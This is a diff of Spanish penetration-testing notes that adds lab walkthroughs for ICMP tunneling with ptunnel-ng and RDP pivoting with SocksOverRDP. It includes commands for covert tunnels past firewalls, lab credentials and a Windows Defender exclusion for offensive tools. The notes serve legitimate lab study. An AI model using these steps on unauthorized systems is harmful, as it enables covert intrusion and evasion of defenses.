@@ -1101,7 +1101,7 @@ sudo ./chisel server --reverse -v -p 1234 --socks5
 ```
 
 >[!Important]
->El flag **`R:`** antes de `socks` es lo que invierte la direccion del tunel: sin el, el cliente pediria un socks normal (saliente desde el, hacia donde el decida). Con `R:socks`, el cliente le dice al servidor "abre tu SOCKS5 del lado tuyo (atacante), y yo (pivote) te sirvo de transporte" — exactamente el mismo concepto que un `ssh -R` pero sin SSH real de por medio.
+>El flag **R:** antes de `socks` es lo que invierte la direccion del tunel: sin el, el cliente pediria un socks normal (saliente desde el, hacia donde el decida). Con `R:socks`, el cliente le dice al servidor "abre tu SOCKS5 del lado tuyo (atacante), y yo (pivote) te sirvo de transporte" — exactamente el mismo concepto que un `ssh -R` pero sin SSH real de por medio.
 ## Configurar proxychains (en ambos modos)
 
 ```shell
@@ -1115,3 +1115,178 @@ tail -f /etc/proxychains.conf
 
 proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 ```
+# ICMP Tunneling with Ptunnel-ng
+
+>[!Important]
+>Escenario mas restrictivo de todos: el firewall bloquea practicamente todo el trafico saliente **excepto ping**. Ptunnel-ng encapsula trafico arbitrario dentro de paquetes **ICMP echo request/response**. El host comprometido manda sus datos reales disfrazados como pings normales hacia un servidor externo que los desempaqueta.
+
+>[!Warning]
+>Herramienta inestable, al menos mientras la probaba.
+
+## Instalacion / compilacion (en el atacante)
+
+Siempre se compila en el atacante, **nunca en el pivote** (ver troubleshooting mas abajo sobre por que).
+
+```shell
+git clone https://github.com/utoni/ptunnel-ng.git
+cd ptunnel-ng
+sudo apt install automake autoconf -y
+```
+
+### Build estatico (recomendado, para evitar depender de las librerias del pivote)
+
+```shell
+make clean
+LDFLAGS="-static" ./configure --enable-static
+make -j4 all
+```
+
+### Verificar que quedo estatico antes de transferir
+
+```shell
+file src/ptunnel-ng
+ldd src/ptunnel-ng
+# Debe decir "statically linked" / "not a dynamic executable"
+```
+
+## Transferir el binario al pivote
+
+Solo el binario, no hace falta la carpeta completa ni archivos sueltos de dependencias, porque el estatico ya las lleva incrustadas.
+
+```shell
+scp src/ptunnel-ng ubuntu@<IP_PIVOTE>:~/
+```
+
+## Levantar el servidor en el pivote
+
+```shell
+sudo ./ptunnel-ng -r<IP_PIVOTE> -R22
+```
+
+## Conectar desde el atacante
+
+```shell
+sudo ./ptunnel-ng -p<IP_PIVOTE> -l2222 -r<IP_PIVOTE> -R22
+```
+
+## Usar el tunel con SSH
+
+```shell
+ssh -p2222 -lubuntu 127.0.0.1
+```
+
+### Encadenar forward dinamico sobre el tunel ICMP ya establecido
+
+```shell
+ssh -D 9050 -p2222 -lubuntu 127.0.0.1
+```
+
+Configurar proxychains como siempre y usar cualquier herramienta a traves del tunel:
+
+```shell
+proxychains nmap -sV -sT <IP_interna> -p<puerto>
+```
+
+## Troubleshooting
+
+Errores y obstaculos reales encontrados al hacer esto:
+
+1. **Error al ejecutar en el pivote por incompatibilidad de glibc** — binario dinamico compilado en un sistema con librerias distintas a las del pivote. Solucion: compilar estatico en el atacante, no en el pivote.
+
+2. **"autoheader: command not found"** si se intenta compilar directamente en el pivote (en vez de transferir ya compilado) — falta el paquete `autoconf` (que provee `autoheader`, requiere tambien `m4` y Perl). Solucion: `sudo apt install autoconf automake -y`.
+   >[!Note]
+   >Compilar en el propio pivote no es ideal en un engagement real: requiere salida a internet para instalar paquetes y deja herramientas de desarrollo instaladas como huella innecesaria. Mejor compilar en el atacante y transferir solo el binario.
+
+3. **El metodo sugerido de editar `autogen.sh` con `sed` para forzar el build estatico puede fallar en silencio** (el sed no modifica la linea esperada por diferencias de comillas/escapes al copiar el comando). Verificar siempre con `tail -5 autogen.sh` que el cambio realmente se aplico antes de confiar en que el build fue estatico. Si fallo, dos alternativas:
+   - (a) editar manualmente esa ultima linea con un editor de texto.
+   - (b) ignorar `autogen.sh` por completo y correr `make clean` / `./configure --enable-static LDFLAGS="-static"` / `make -j4 all` directamente a mano — esta segunda opcion es la mas confiable.
+
+4. **Si tras forzar `-static` el binario sigue saliendo dinamico** (confirmarlo con `ldd`, que no debe listar ninguna libreria), puede faltar la version estatica (`.a`) de alguna dependencia como OpenSSL/zlib/zstd. Solucion:
+   ```shell
+   sudo apt install libssl-dev zlib1g-dev libzstd-dev -y
+   ```
+   y recompilar.
+
+5. Un warning de `libselinux.so.1: no version information available` al arrancar el servidor en el pivote es **inofensivo**, no detiene la ejecucion — no confundirlo con un error fatal.
+
+### Tip de verificacion
+
+Ambos lados (cliente y servidor) de ptunnel-ng muestran estadisticas de sesion (I/O, ICMP I/O/R, Loss %) que sirven para confirmar que el trafico realmente esta viajando dentro de paquetes ICMP y no como TCP plano. Para una confirmacion mas rigurosa, comparar con Wireshark una conexion SSH normal (trafico TCP/SSHv2 visible) contra la misma conexion por el tunel ICMP (solo se ve trafico ICMP, el contenido real queda oculto dentro del payload).
+# RDP and SOCKS Tunneling with SocksOverRDP
+
+>[!Important]
+>SocksOverRDP abusa de los **Dynamic Virtual Channels (DVC)** del protocolo RDP — un mecanismo legitimo normalmente usado para compartir portapapeles o audio entre cliente y sesion remota — para tunelizar paquetes SOCKS arbitrarios. Sirve especificamente cuando el entorno es puramente Windows y no hay forma de usar SSH para pivotar.
+
+>[!Warning]
+>Requisito obligatorio: esta tecnica SOLO funciona si el atacante usa `mstsc.exe` (el cliente RDP nativo de Microsoft) como su propio cliente de conexion — el plugin de DVC se integra con la arquitectura de `mstsc.exe` especificamente, no existe equivalente en `xfreerdp` (Linux). Por lo tanto, el atacante necesita tener acceso a un Windows propio para ejecutar esta tecnica, a diferencia de SSH/Chisel/Sshuttle/Dnscat2/Ptunnel-ng que si funcionan desde Linux.
+
+## Escenario (cadena de tres maquinas)
+
+```txt
+[Atacante Windows] --RDP + SOCKS por DVC--> [172.16.5.19: foothold] --SocksOverRDP-Server--> [172.16.6.155: objetivo final]
+```
+
+## Binarios necesarios (descargar en el atacante)
+
+1. **SocksOverRDP x64 Binaries**: https://github.com/nccgroup/SocksOverRDP/releases
+2. **Proxifier Portable** (ProxifierPE.zip): https://www.proxifier.com/download/#win-tab
+
+>[!Note]
+>Windows Defender puede borrar el zip de SocksOverRDP al descargarlo por ser detectado como herramienta ofensiva. Solucion: agregar una exclusion de carpeta especifica (no desactivar Defender por completo) antes de descargarlo:
+>```powershell
+>Add-MpPreference -ExclusionPath "C:\ruta\a\la\carpeta"
+>```
+
+## Cargar el plugin (en el atacante, Windows)
+
+```cmd
+regsvr32.exe SocksOverRDP-Plugin.dll
+```
+
+## Conectar por RDP con el plugin activo
+
+```cmd
+mstsc.exe
+```
+
+Conectando a `172.16.5.19` con credenciales (ej. `victor:pass@123`) — debe aparecer el aviso de que SocksOverRDP esta habilitado, escuchando en `127.0.0.1:1080`.
+
+## Arrancar el servidor en el segundo salto (foothold)
+
+Con privilegios de administrador:
+
+```cmd
+SocksOverRDP-Server.exe
+```
+
+## Verificar que el SOCKS quedo activo
+
+```cmd
+netstat -antb | findstr 1080
+```
+
+```
+TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING
+```
+
+## Encadenar hacia el objetivo final
+
+Configurar **Proxifier** para redirigir todo el trafico hacia `127.0.0.1:1080`, y luego correr `mstsc.exe` de nuevo apuntando al objetivo final (`172.16.6.155`) — ese trafico se intercepta por Proxifier, viaja por el DVC de la sesion RDP original, y `SocksOverRDP-Server.exe` lo enruta hacia la red donde vive el objetivo final.
+
+## Ajuste de rendimiento
+
+Relevante por los multiples saltos encadenados (RDP -> DVC -> SOCKS -> otro RDP):
+
+```
+mstsc.exe -> pestana "Experience" -> Performance: "Modem"
+```
+
+Reduce efectos visuales, wallpaper y animaciones, para priorizar ancho de banda sobre fidelidad visual.
+
+## Notas, tips y advertencias
+
+- **Proxifier es software de pago**, pero se instala en la maquina del ATACANTE (su propio kit de herramientas), nunca en la victima — existe version de prueba gratuita de 31 dias y version portable, suficiente para la duracion tipica de un engagement.
+- Para probar esta tecnica en un laboratorio personal sin tener una maquina Windows dedicada: usar las **VMs de evaluacion gratuitas de Microsoft (90 dias)** desde https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/, configuradas con recursos minimos (3-4GB RAM, 2 CPU, efectos visuales desactivados) para no afectar el rendimiento del host.
+- Windows Defender puede marcar el zip de SocksOverRDP como herramienta ofensiva al descargarlo (ver exclusion de Defender arriba).
+- **Tomar un snapshot de la VM antes de instalar las herramientas**, para poder revertir rapido si algo sale mal o se quiere repetir la prueba desde cero.
+
